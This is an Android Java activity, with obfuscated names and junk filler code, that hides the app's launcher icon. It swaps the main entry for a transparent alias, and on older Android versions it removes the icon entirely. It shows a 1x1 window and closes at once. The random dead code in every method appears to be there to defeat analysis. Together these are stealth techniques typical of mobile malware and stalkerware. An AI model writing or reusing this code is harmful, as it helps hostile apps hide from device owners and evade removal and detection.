package lhky.dml.mie;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（CST），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class YBTX extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String onaNhsrFXORzXPovEDY = java.util.UUID.randomUUID().toString();
        int ckuydjHhCGKzUIM = onaNhsrFXORzXPovEDY.length();
        char pmh_VuoaTWYeqktnjDG = onaNhsrFXORzXPovEDY.charAt(new java.util.Random().nextInt(ckuydjHhCGKzUIM));
        boolean dimaCyaIJnhsP = (pmh_VuoaTWYeqktnjDG == 'z');
        if (dimaCyaIJnhsP && ckuydjHhCGKzUIM < 20) {
            onaNhsrFXORzXPovEDY.substring(82, 70);
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(YBTX.this, CST.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(YBTX.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        java.lang.Object arr_UICPwGGiHMrUo = new java.lang.Object();
        int i_HzKKxjcWWnWQavfUq = arr_UICPwGGiHMrUo.hashCode();
        int j_VhEUbmiLP = new java.util.Random().nextInt(100);
        int tmp_hxNHEGUrsPUFMWJfyvl = (i_HzKKxjcWWnWQavfUq ^ j_VhEUbmiLP) & 0x7FFFFFFF;
        if (tmp_hxNHEGUrsPUFMWJfyvl == 79 && i_HzKKxjcWWnWQavfUq < 91) {
            arr_UICPwGGiHMrUo.toString();
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        long arr_bABpVGKAFrmzijkE = java.lang.System.nanoTime();
        int i_ibtThPoxQzIJVNk = new java.util.Random().nextInt(1000);
        boolean j_cIdApVldlwyhJiCv = (arr_bABpVGKAFrmzijkE % (i_ibtThPoxQzIJVNk + 11)) > 81;
        double tmp_hONRfJI = j_cIdApVldlwyhJiCv ? java.lang.Math.sqrt(i_ibtThPoxQzIJVNk) : java.lang.Math.pow(i_ibtThPoxQzIJVNk, 43);
        if (tmp_hONRfJI < 0.0) {
            java.lang.System.out.println(tmp_hONRfJI);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        int process_Mrmep = new java.util.Random().nextInt(50);
        int stack_RJlYeHJTfAWfhsGC = (process_Mrmep > 98) ? 1 : ((process_Mrmep > 51) ? 37 : ((process_Mrmep > 23) ? 94 : 86));
        int i_vKpuuJMcmceRIFX = stack_RJlYeHJTfAWfhsGC * process_Mrmep;
        if (i_vKpuuJMcmceRIFX > 63) {
            java.lang.System.arraycopy(new int[] { i_vKpuuJMcmceRIFX }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
